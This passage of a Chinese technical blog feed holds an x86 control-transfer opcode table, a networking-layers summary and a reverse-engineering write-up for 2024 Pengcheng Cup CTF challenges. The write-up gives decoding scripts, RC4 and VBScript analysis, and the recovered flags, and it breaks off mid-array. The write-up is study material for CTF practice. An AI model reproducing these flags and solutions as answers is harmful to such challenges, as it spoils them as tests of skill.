(CF=1) 时近跳转</td></tr><tr><td>0F 84 <strong>cw/cd</strong></td><td>JE <strong>rel16/32</strong></td><td>相等 (ZF=1) 时近跳转</td></tr><tr><td>0F 84 <strong>cw/cd</strong></td><td>JZ <strong>rel16/32</strong></td><td>为 0 (ZF=1) 时近跳转</td></tr><tr><td>0F 8F <strong>cw/cd</strong></td><td>JG <strong>rel16/32</strong></td><td>大于（ZF=0 且  SF=OF）时近跳转</td></tr></tbody></table><table><thead><tr><th>操作码</th><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>0F 8D <strong>cw/cd</strong></td><td>JGE <strong>rel16/32</strong></td><td>大于或等于 (SF=OF) 时近跳转</td></tr><tr><td>0F 8C <strong>cw/cd</strong></td><td>JL <strong>rel16/32</strong></td><td>小于 (SF&lt;&gt;OF)  时近跳转</td></tr><tr><td>0F 8E <strong>cw/cd</strong></td><td>JLE <strong>rel16/32</strong></td><td>小于或等于（ZF=1 或  SF&lt;&gt;OF）时近跳转</td></tr><tr><td>0F 86 <strong>cw/cd</strong></td><td>JNA <strong>rel16/32</strong></td><td>不高于（CF=1 或 ZF=1）时近跳转</td></tr><tr><td>0F 82 <strong>cw/cd</strong></td><td>JNAE <strong>rel16/32</strong></td><td>不高于或等于 (CF=1) 时近跳转</td></tr><tr><td>0F 83 <strong>cw/cd</strong></td><td>JNB <strong>rel16/32</strong></td><td>不低于 (CF=0) 时近跳转</td></tr><tr><td>0F 87 <strong>cw/cd</strong></td><td>JNBE <strong>rel16/32</strong></td><td>不低于或等于（CF=0 或  ZF=0）时近跳转</td></tr><tr><td>0F 83 <strong>cw/cd</strong></td><td>JNC <strong>rel16/32</strong></td><td>无进位 (CF=0) 时近跳转</td></tr><tr><td>0F 85 <strong>cw/cd</strong></td><td>JNE <strong>rel16/32</strong></td><td>不相等 (ZF=0) 时近跳转</td></tr><tr><td>0F 8E <strong>cw/cd</strong></td><td>JNG <strong>rel16/32</strong></td><td>不大于（ZF=1 或  SF&lt;&gt;OF）时近跳转</td></tr><tr><td>0F 8C <strong>cw/cd</strong></td><td>JNGE <strong>rel16/32</strong></td><td>不大于或等于 (SF&lt;&gt;OF)  时近跳转</td></tr><tr><td>0F 8D <strong>cw/cd</strong></td><td>JNL <strong>rel16/32</strong></td><td>不小于 (SF＝OF) 时近跳转</td></tr><tr><td>0F 8F <strong>cw/cd</strong></td><td>JNLE <strong>rel16/32</strong></td><td>不小于或等于（ZF=0 且  SF=OF）时近跳转</td></tr><tr><td>0F 81 <strong>cw/cd</strong></td><td>JNO <strong>rel16/32</strong></td><td>不上溢 (OF=0) 时近跳转</td></tr><tr><td>0F 8B <strong>cw/cd</strong></td><td>JNP <strong>rel16/32</strong></td><td>奇校验 (PF=0) 时近跳转</td></tr><tr><td>0F 89 <strong>cw/cd</strong></td><td>JNS <strong>rel16/32</strong></td><td>正数 (SF＝0) 时近跳转</td></tr><tr><td>0F 85 <strong>cw/cd</strong></td><td>JNZ <strong>rel16/32</strong></td><td>不为零 (ZF=0) 时近跳转</td></tr><tr><td>0F 80 <strong>cw/cd</strong></td><td>JO <strong>rel16/32</strong></td><td>上溢 (OF=1) 时近跳转</td></tr><tr><td>0F 8A <strong>cw/cd</strong></td><td>JP <strong>rel16/32</strong></td><td>偶校验 (PF=1) 时近跳转</td></tr><tr><td>0F 8A <strong>cw/cd</strong></td><td>JPE <strong>rel16/32</strong></td><td>偶校验 (PF=1) 时近跳转</td></tr><tr><td>0F 8B <strong>cw/cd</strong></td><td>JPO <strong>rel16/32</strong></td><td>奇校验 (PF=0) 时近跳转</td></tr><tr><td>0F 88 <strong>cw/cd</strong></td><td>JS <strong>rel16/32</strong></td><td>负数 (SF＝1) 时近跳转</td></tr><tr><td>0F 84 <strong>cw/cd</strong></td><td>JZ <strong>rel16/32</strong></td><td>为 0 (ZF=1) 时近跳转</td></tr></tbody></table><h2 id="过程调用指令">过程调用指令</h2><table><thead><tr><th>操作码</th><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>E8 <strong>cw</strong></td><td>CALL <strong>rel16</strong></td><td>相对近调用，位移量相对于下一条指令</td></tr><tr><td>E8 <strong>cd</strong></td><td>CALL <strong>rel32</strong></td><td>相对近调用，位移量相对于下一条指令</td></tr><tr><td>FF /2</td><td>CALL <strong>r/m16</strong></td><td>绝对间接近调用，地址由 <strong>r/m16</strong> 给出</td></tr><tr><td>FF /2</td><td>CALL <strong>r/m32</strong></td><td>绝对间接近调用，地址由 <strong>r/m32</strong> 给出</td></tr><tr><td>9A <strong>cd</strong></td><td>CALL <strong>ptr16:16</strong></td><td>绝对远调用，地址由操作数给出</td></tr><tr><td>9A <strong>cp</strong></td><td>CALL <strong>ptr16:32</strong></td><td>绝对远调用，地址由操作数给出</td></tr><tr><td>FF /3</td><td>CALL <strong>m16:16</strong></td><td>绝对间接远调用，地址由 <strong>m16:16</strong> 给出</td></tr><tr><td>FF /3</td><td>CALL <strong>m16:32</strong></td><td>绝对间接远调用，地址由 <strong>m16:32</strong> 给出</td></tr></tbody></table><table><thead><tr><th>操作码</th><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>C3</td><td>RET</td><td>近返回到调用过程</td></tr><tr><td>CB</td><td>RET</td><td>远返回到调用过程</td></tr><tr><td>C2 <strong>iw</strong></td><td>RET <strong>imm16</strong></td><td>近返回到调用过程，并从堆栈弹出 <strong>imm16</strong> 个字节</td></tr><tr><td>CA <strong>iw</strong></td><td>RET <strong>imm16</strong></td><td>远返回到调用过程，并从堆栈弹出 <strong>imm16</strong> 个字节</td></tr></tbody></table><p>retf指令：先弹出值到IP寄存器，再弹出值到CS段寄存器实现返回。</p><h2 id="循环指令">循环指令</h2><table><thead><tr><th>操作码</th><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>E2 <strong>cb</strong></td><td>LOOP <strong>rel8</strong></td><td>递减计数；计数  $\not =$ 0 时短跳转</td></tr><tr><td>E1 <strong>cb</strong></td><td>LOOPE <strong>rel8</strong></td><td>递减计数；计数  $\not =$  0 且 ZF=1 时短跳转</td></tr><tr><td>E1 <strong>cb</strong></td><td>LOOPZ <strong>rel8</strong></td><td>递减计数；计数  $\not =$  0 且 ZF=1 时短跳转</td></tr><tr><td>E0 <strong>cb</strong></td><td>LOOPNE <strong>rel8</strong></td><td>递减计数；计数  $\not =$  0 且 ZF=0 时短跳转</td></tr><tr><td>E0 <strong>cb</strong></td><td>LOOPNZ <strong>rel8</strong></td><td>递减计数；计数  $\not =$  0 且 ZF=0 时短跳转</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">汇编中的控制转移指令</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="逆向" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/"/>
    
    <category term="基础" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="汇编" scheme="https://www.pri87.vip/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>五层网络协议小总结</title>
    <link href="https://www.pri87.vip/posts/f8da60a2.html"/>
    <id>https://www.pri87.vip/posts/f8da60a2.html</id>
    <published>2024-12-23T07:15:47.000Z</published>
    <updated>2024-12-24T17:34:17.587Z</updated>
    
    <content type="html"><![CDATA[<h2 id="理论五层模型">理论五层模型</h2><p>分为：<br>应用层，传输层，网络层，数据链路层，物理层</p><p>每一层都负责了一部分内容并给上一层打下基础</p><p>协议：每一层通过支持对应的协议来实现本层的功能，两个机器在同一层如果不支持相同的协议，就不能正常通信。</p><h3 id="物理层">物理层</h3><p>作用：实现传输比特信号，需要实现01模拟信号和其它信号之间的转换</p><p>物理实现：中继器，集线器</p><p>对应协议：网线，光纤等的接口类型，传输介质的速率标准等</p><p>流程：从模拟信号转为其它信号后，通过物理路径（引导/非引导）到线路终点再被转为模拟信号</p><p>其它注意点：复用技术（码分多址），X工通信</p><h3 id="数据链路层">数据链路层</h3><p>作用：实现帧的传输，对于上层数据的透明传输（对上层不可见），一定的差错检查。</p><p>物理实现：网卡（MAC地址），交换机</p><p>对应协议：PPP协议和以太网协议（实现封装成帧，透明传输和差错检查）</p><p>流程：对于一段链路，先将网络层下交的数据封装成MAC帧，通过对应的协议去传输帧，交换机维护了一张<code>转发表</code>，在这里找到目的MAC地址后转发给对应的端口，然后交给物理层。如果是主机发送，则直接发给连接的交换机。</p><h3 id="网络层">网络层</h3><p>作用：实现IP数据报的传输，选择合适的路线传送数据。是非主机的设备的最高层</p><p>物理实现：路由器</p><p>对应协议：IP协议，以及它需要的ARP地址解析协议和在它之上的ICMP报文控制协议和IGMP组管理协议。</p><p>流程：对于传输层的数据，先转为对应的IP数据报，从上层得到的套接字中有目的IP地址，通过路由器中的路由选择协议（RIP，OSPF，BGP）更新自己的<code>路由表</code>，通过路由表找到对应的IP地址，然后转发给对应的端口，转发前，通过ARP协议取IP对应的MAC地址，先将MAC帧中的源MAC地址改为这个端口的地址，将目的MAC地址转为下一跳设备的MAC地址。然后发给数据链路层</p><h3 id="传输层">传输层</h3><p>作用：向应用层提供服务，实现进程间的通信。复用和分用。可信传输，差错检查，流量控制，拥塞控制等</p><p>物理实现：主机</p><p>对应协议：TCP/UDP，一个是面向连接的，数据传输的单位是报文段，能够提供可靠的交付。 一个是无连接的，数据传输的单位是用户数据报，不保证提供可靠的交付，只能提供“尽最大努力交付”。</p><p>流程：发送的情况：根据不同的协议要求，然后转为TCP/UDP头部信息。直接给下一层。如果是TCP会有三次交换数据请求连接等这种本层处理的事项。接收的情况：收到后拼接，然后向上发给应用层。</p><h3 id="应用层">应用层</h3><p>作用：实现需要的功能</p><p>物理实现：无</p><p>对应协议：很多，比如：DNS，http等</p><p>流程：对应不同实现有不同流程</p>]]></content>
    
    
    <summary type="html">用来复习，不是很严谨</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="开发" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/"/>
    
    <category term="网络编程" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    
    <category term="计算机网络" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
  </entry>
  
  <entry>
    <title>鹏城杯2024-re-复现</title>
    <link href="https://www.pri87.vip/posts/674d40c7.html"/>
    <id>https://www.pri87.vip/posts/674d40c7.html</id>
    <published>2024-12-22T06:54:51.000Z</published>
    <updated>2024-12-22T07:51:35.751Z</updated>
    
    <content type="html"><![CDATA[<h2 id="RE">RE</h2><h3 id="chall-py">chall_py</h3><p>发现全是base，用解密脚本解密为代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">strr = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&#x27;./chall.py&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    strr = f.read()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&quot;&quot;&quot;\s*(.*?)\s*&quot;&quot;&quot;&#x27;</span>, re.DOTALL) </span><br><span class="line">    matches = pattern.findall(strr.decode())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;b32decode&#x27;</span> <span class="keyword">in</span> strr:</span><br><span class="line">        strr = b32decode(matches[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">b&#x27;b64decode&#x27;</span> <span class="keyword">in</span> strr:</span><br><span class="line">        strr = b64decode(matches[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">b&#x27;b85decode&#x27;</span> <span class="keyword">in</span> strr:</span><br><span class="line">        strr = b85decode(matches[<span class="number">0</span>])    </span><br><span class="line">    <span class="keyword">elif</span> <span class="string">b&#x27;a85decode&#x27;</span> <span class="keyword">in</span> strr:</span><br><span class="line">        strr = a85decode(matches[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./res.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(strr)</span><br></pre></td></tr></table></figure><p>输出为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="literal">True</span></span><br><span class="line">d=<span class="built_in">len</span></span><br><span class="line">G=<span class="built_in">list</span></span><br><span class="line">g=<span class="built_in">range</span></span><br><span class="line">s=<span class="built_in">next</span></span><br><span class="line">R=<span class="built_in">bytes</span></span><br><span class="line">o=<span class="built_in">input</span></span><br><span class="line">Y=<span class="built_in">print</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">l</span>(<span class="params">S</span>):</span><br><span class="line"> i=<span class="number">0</span></span><br><span class="line"> j=<span class="number">0</span></span><br><span class="line"> <span class="keyword">while</span> a:</span><br><span class="line">  i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">  j=(j+S[i])%<span class="number">256</span></span><br><span class="line">  S[i],S[j]=S[j],S[i]</span><br><span class="line">  K=S[(S[i]+S[j])%<span class="number">256</span>]</span><br><span class="line">  <span class="keyword">yield</span> K</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">N</span>(<span class="params">key,O</span>):</span><br><span class="line"> I=d(key)</span><br><span class="line"> S=G(g(<span class="number">256</span>))</span><br><span class="line"> j=<span class="number">0</span></span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> g(<span class="number">256</span>):</span><br><span class="line">  j=(j+S[i]+key[i%I])%<span class="number">256</span></span><br><span class="line">  S[i],S[j]=S[j],S[i]</span><br><span class="line"> z=l(S)</span><br><span class="line"> n=[]</span><br><span class="line"> <span class="keyword">for</span> k <span class="keyword">in</span> O:</span><br><span class="line">  n.append(k^s(z)+<span class="number">2</span>)</span><br><span class="line"> <span class="keyword">return</span> R(n)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">E</span>(<span class="params">s,parts_num</span>):</span><br><span class="line"> Q=d(s.decode())</span><br><span class="line"> S=Q//parts_num</span><br><span class="line"> u=Q%parts_num</span><br><span class="line"> W=[]</span><br><span class="line"> j=<span class="number">0</span></span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> g(parts_num):</span><br><span class="line">  T=j+S</span><br><span class="line">  <span class="keyword">if</span> u&gt;<span class="number">0</span>:</span><br><span class="line">   T+=<span class="number">1</span></span><br><span class="line">   u-=<span class="number">1</span></span><br><span class="line">  W.append(s[j:T])</span><br><span class="line">  j=T</span><br><span class="line"> <span class="keyword">return</span> W</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> L=o(<span class="string">&#x27;input the flag: &gt;&gt;&gt; &#x27;</span>).encode()</span><br><span class="line"> <span class="keyword">assert</span> d(L)%<span class="number">2</span>==<span class="number">0</span>,<span class="string">&#x27;flag length should be even&#x27;</span></span><br><span class="line"> t=<span class="string">b&#x27;v3ry_s3cr3t_p@ssw0rd&#x27;</span></span><br><span class="line"> O=E(L,<span class="number">2</span>)</span><br><span class="line"> U=[]</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> O:</span><br><span class="line">  U.append(N(t,i).<span class="built_in">hex</span>())</span><br><span class="line"> <span class="keyword">if</span> U==[<span class="string">&#x27;1796972c348bc4fe7a1930b833ff10a80ab281627731ab705dacacfef2e2804d74ab6bc19f60&#x27;</span>,2ea999141a8cc9e47975269340c177c726a8aa732953a66a6af183bcd9cec8464a<span class="string">&#x27;]:</span></span><br><span class="line"><span class="string">  Y(&#x27;</span>Congratulations! You got the flag!<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"> else:</span></span><br><span class="line"><span class="string">  Y(&#x27;</span>Wrong flag!<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/09/DmEqGt8dscFrKgQ.png" alt="image-20241109172858511"></p><p>发现这里少了一个\‘,补上,然后看看感觉是RC4，所以直接把结果在调试的时候粘贴进去解出来得到</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">666</span><span class="keyword">c</span><span class="number">61677</span>b<span class="number">7468456e5</span>f<span class="number">495</span>f<span class="number">4361355</span>f<span class="number">42455</span>f<span class="number">596</span>f<span class="number">55525</span>f<span class="number">4</span>f<span class="number">6e6</span><span class="keyword">c</span><span class="number">375</span>f<span class="number">45786543557469366e5</span>f<span class="number">536</span>f<span class="number">5</span>f<span class="number">5573655</span>f<span class="number">6</span>d<span class="number">335</span>f<span class="number">74305</span>f<span class="number">52306e5</span>f<span class="number">744831375</span>f<span class="number">45783343757469306e7</span>d</span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;thEn_I_Ca5_BE_YoUR_Onl7_ExeCUti6n_So_Use_m3_t0_R0n_tH17_Ex3Cuti0n&#125;</span></span><br></pre></td></tr></table></figure><h3 id="joyVBS">joyVBS</h3><p>和上一个题的思路</p><p>开头添加</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dim fso, <span class="keyword">file</span></span><br><span class="line"><span class="keyword">Set</span> fso = CreateObject(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> <span class="keyword">file</span> = fso.CreateTextFile(<span class="string">&quot;output.txt&quot;</span>, <span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>改为file.Write</p><p>得到文件</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">MsgBox <span class="string">&quot;VBScript, often abbreviated as VBS, is an event-driven programming language developed by Microsoft, primarily used for scripting in the Windows environment.&quot;</span></span><br><span class="line">MsgBox <span class="string">&quot;It is based on the Visual Basic programming language and is designed to be simple and easy to use, especially for those familiar with the BASIC programming language.&quot;</span></span><br><span class="line">MsgBox <span class="string">&quot;And for me, it is the first programming language that I&#x27;ve leart&quot;</span></span><br><span class="line">MsgBox <span class="string">&quot;Hackers! Have fun with this VBS challenge!&quot;</span></span><br><span class="line">flag = <span class="built_in">InputBox</span>(<span class="string">&quot;Enter the FLAG:&quot;</span>, <span class="string">&quot;Hack for fun&quot;</span>)</span><br><span class="line">wefbuwiue = <span class="string">&quot;NalvN3hKExBtALBtInPtNHTnKJ80L3JtqxTboRA/MbF3LnT0L2zHL2SlqnPtJLAnFbIlL2SnFT8lpzFzA2JHrRTiNmT9&quot;</span></span><br><span class="line"></span><br><span class="line">qwfe = <span class="number">9</span>+<span class="number">2</span>+<span class="number">2</span>+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> Base64Decode(base64EncodedString)</span><br><span class="line">    <span class="keyword">Dim</span> xml, elem</span><br><span class="line">    <span class="keyword">Set</span> xml = <span class="built_in">CreateObject</span>(<span class="string">&quot;MSXML2.DOMDocument&quot;</span>)</span><br><span class="line">    <span class="keyword">Set</span> elem = xml.createElement(<span class="string">&quot;tmp&quot;</span>)</span><br><span class="line">    elem.dataType = <span class="string">&quot;bin.base64&quot;</span> </span><br><span class="line">    elem.text = base64EncodedString </span><br><span class="line">    <span class="keyword">Dim</span> stream</span><br><span class="line">    <span class="keyword">Set</span> stream = <span class="built_in">CreateObject</span>(<span class="string">&quot;ADODB.Stream&quot;</span>)</span><br><span class="line">    stream.Type = <span class="number">1</span> <span class="comment">&#x27;Binary</span></span><br><span class="line">    stream.Open</span><br><span class="line">    stream.Write elem.nodeTypedValue </span><br><span class="line">    stream.Position = <span class="number">0</span></span><br><span class="line">    stream.Type = <span class="number">2</span> <span class="comment">&#x27;Text</span></span><br><span class="line">    stream.Charset = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">    Base64Decode = stream.ReadText</span><br><span class="line">    stream.Close</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"><span class="keyword">Function</span> Caesar(str,offset)</span><br><span class="line"><span class="keyword">Dim</span> length,char,i</span><br><span class="line">Caesar = <span class="string">&quot;&quot;</span></span><br><span class="line">length = <span class="built_in">Len</span>(str)</span><br><span class="line"><span class="keyword">For</span> i = <span class="number">1</span> <span class="keyword">To</span> length</span><br><span class="line">char = <span class="built_in">Mid</span>(str,i,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">If</span> char &gt;= <span class="string">&quot;A&quot;</span> <span class="keyword">And</span> char &lt;= <span class="string">&quot;Z&quot;</span> <span class="keyword">Then</span></span><br><span class="line">char = <span class="built_in">Asc</span>(<span class="string">&quot;A&quot;</span>) + (<span class="built_in">Asc</span>(char) - <span class="built_in">Asc</span>(<span class="string">&quot;A&quot;</span>) + offset) Mod <span class="number">26</span></span><br><span class="line">Caesar = Caesar &amp; <span class="built_in">Chr</span>(char)</span><br><span class="line"><span class="keyword">ElseIf</span> char &gt;= <span class="string">&quot;a&quot;</span> <span class="keyword">And</span> char &lt;= <span class="string">&quot;z&quot;</span> <span class="keyword">Then</span></span><br><span class="line">char = <span class="built_in">Asc</span>(<span class="string">&quot;a&quot;</span>) + (<span class="built_in">Asc</span>(char) - <span class="built_in">Asc</span>(<span class="string">&quot;a&quot;</span>) + offset) Mod <span class="number">26</span></span><br><span class="line">Caesar = Caesar &amp; <span class="built_in">Chr</span>(char)</span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">Caesar = Caesar &amp; char</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> flag = Base64Decode(Caesar(wefbuwiue, <span class="number">26</span>-qwfe)) <span class="keyword">Then</span></span><br><span class="line">    MsgBox <span class="string">&quot;Congratulations! Correct  FLAG!&quot;</span></span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">    MsgBox <span class="string">&quot;Wrong flag.&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br></pre></td></tr></table></figure><p>尝试直接输出Base64Decode</p><p><img src="https://s2.loli.net/2024/11/09/6BCL3jP7U4QIdNV.png" alt="image-20241109173144980"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;VB3_1s_S0_e1sY_4_u_r1gh3?btw_1t_iS_a1s0_Us3Fu1_a3D_1nTe3eSt1ng!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="re5">re5</h3><p>调试可以看出，每次的SEH都使用rand()修改了delta，</p><p><img src="https://s2.loli.net/2024/11/09/owkBQxFVCJLnyUp.png" alt="image-20241109173349124"></p><p>这里可以看到srand初始化是0，那么直接输出每次的delta即可，同时key不是1234而是2233很怪不知道为什么</p><p>然后直接写脚本解即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> delta[] = &#123; <span class="number">0x26</span>, <span class="number">0x1e27</span>, <span class="number">0x52f6</span>, <span class="number">0x985</span>, <span class="number">0x2297</span>, <span class="number">0x2e15</span>, <span class="number">0x20ad</span>, <span class="number">0x7e1d</span>, <span class="number">0x28d2</span>, <span class="number">0x7794</span>, <span class="number">0x16dd</span>, <span class="number">0x6dc4</span>, <span class="number">0x476</span>, <span class="number">0x119</span>, <span class="number">0x5039</span>, <span class="number">0x3e31</span>, <span class="number">0x22f1</span>, <span class="number">0x66ad</span>, <span class="number">0xbb5</span>, <span class="number">0x3958</span>, <span class="number">0x51f0</span>, <span class="number">0x7c93</span>, <span class="number">0x5497</span>, <span class="number">0x6532</span>, <span class="number">0x4819</span>, <span class="number">0x52b</span>, <span class="number">0x70d1</span>, <span class="number">0x8c0</span>, <span class="number">0x25fd</span>, <span class="number">0x7e16</span>, <span class="number">0x98e</span>, <span class="number">0x24e</span>, <span class="number">0x348</span>, <span class="number">0x489b</span>, <span class="number">0x420b</span>, <span 